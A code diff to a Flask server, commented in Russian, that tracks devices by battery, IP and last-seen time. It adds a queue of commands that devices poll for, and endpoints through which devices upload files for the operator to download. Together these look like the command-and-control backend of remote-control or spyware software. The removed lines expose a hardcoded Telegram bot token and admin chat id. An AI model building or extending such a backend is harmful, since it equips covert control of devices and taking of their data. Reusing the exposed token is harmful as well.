@@ -7,12 +7,12 @@ import time
 from datetime import datetime, timedelta
 import os
 import io
+import base64
 
 app = Flask(__name__, instance_path='/tmp/instance')
 
 DB_PATH = '/tmp/devices.db'
 FILES_DIR = '/tmp/files'
-
 os.makedirs(FILES_DIR, exist_ok=True)
 
 def init_db():
@@ -26,6 +26,18 @@ def init_db():
                   battery INTEGER,
                   ip TEXT,
                   last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS commands
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  device_id TEXT,
+                  command TEXT,
+                  status TEXT DEFAULT 'pending',
+                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS files
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  device_id TEXT,
+                  filename TEXT,
+                  data TEXT,
+                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
     conn.commit()
     conn.close()
 
@@ -64,21 +76,70 @@ def update_device():
     conn.close()
     return 'OK'
 
+# ===== ОЧЕРЕДЬ КОМАНД =====
 @app.route('/api/command', methods=['POST'])
-def send_command():
+def add_command():
     data = request.json
     device_id = data.get('deviceId')
     command = data.get('command')
     
-    try:
-        token = "8876390846:AAELEYzUJAUpH3ysUeOO9IdMMBy3mKYzxig"
-        admin_id = "6178711912"
-        text = f"📩 КОМАНДА\nID: {device_id}\nКоманда: {command}"
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
-                      json={"chat_id": admin_id, "text": text}, timeout=5)
-        return jsonify({"status": "ok", "message": "Команда отправлена"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('INSERT INTO commands (device_id, command) VALUES (?, ?)', (device_id, command))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({'status': 'ok'})
+
+@app.route('/api/poll/<device_id>')
+def poll_commands(device_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('SELECT id, command FROM commands WHERE device_id = ? AND status = "pending" ORDER BY id LIMIT 1', (device_id,))
+    row = c.fetchone()
+    if row:
+        c.execute('UPDATE commands SET status = "sent" WHERE id = ?', (row[0],))
+        conn.commit()
+        conn.close()
+        return jsonify({'command': row[1]})
+    conn.close()
+    return jsonify({'command': None})
+
+# ===== ЗАГРУЗКА ФАЙЛОВ =====
+@app.route('/api/upload', methods=['POST'])
+def upload_file():
+    data = request.json
+    device_id = data.get('deviceId')
+    filename = data.get('filename')
+    content = data.get('content')
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('INSERT INTO files (device_id, filename, data) VALUES (?, ?, ?)', 
+              (device_id, filename, content))
+    conn.commit()
+    conn.close()
+    return 'OK'
+
+@app.route('/api/download/<device_id>/<filename>')
+def download_file(device_id, filename):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('SELECT data FROM files WHERE device_id = ? AND filename = ? ORDER BY id DESC LIMIT 1', 
+              (device_id, filename))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        try:
+            data = base64.b64decode(row[0])
+            return send_file(
+                io.BytesIO(data),
+                as_attachment=True,
+                download_name=filename
+            )
+        except:
+            pass
+    return 'File not found', 404
 
 # ===== АВТОМАТИЧЕСКИЙ ПЕРЕВОД В ОФФЛАЙН =====
 def check_offline():
@@ -94,8 +155,8 @@ def check_offline():
                              AND last_seen < ?''', (five_min_ago,))
                 conn.commit()
                 conn.close()
-            except Exception as e:
-                print(f"❌ Ошибка: {e}")
+            except:
+                pass
             time.sleep(60)
 
 threading.Thread(target=check_offline, daemon=True).start()
